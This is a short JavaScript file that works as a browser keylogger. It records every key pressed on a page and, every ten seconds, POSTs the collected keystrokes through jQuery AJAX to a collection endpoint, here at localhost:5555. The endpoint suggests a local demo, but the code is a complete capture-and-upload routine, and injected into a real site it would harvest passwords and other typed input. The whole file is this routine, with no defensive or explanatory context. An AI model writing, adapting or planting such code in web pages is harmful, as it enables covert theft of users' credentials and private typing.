var i = 10;
var res = '';

document.addEventListener('keydown', (e) => {
	i--;
	res += e.key;
	if (i === 0) {
		i = 10;
		console.log(res);
	}
});

var tenSeconds = 10000;
var myVar = setInterval(sendColectedData, tenSeconds);

function sendColectedData() {
	if (res !== '') {
		$.ajax({
			type: "POST",
			url: "http://localhost:5555/api/data/saveToFile",
			data: res,
			success: function () {
				res = ''
			}
		});
	}
};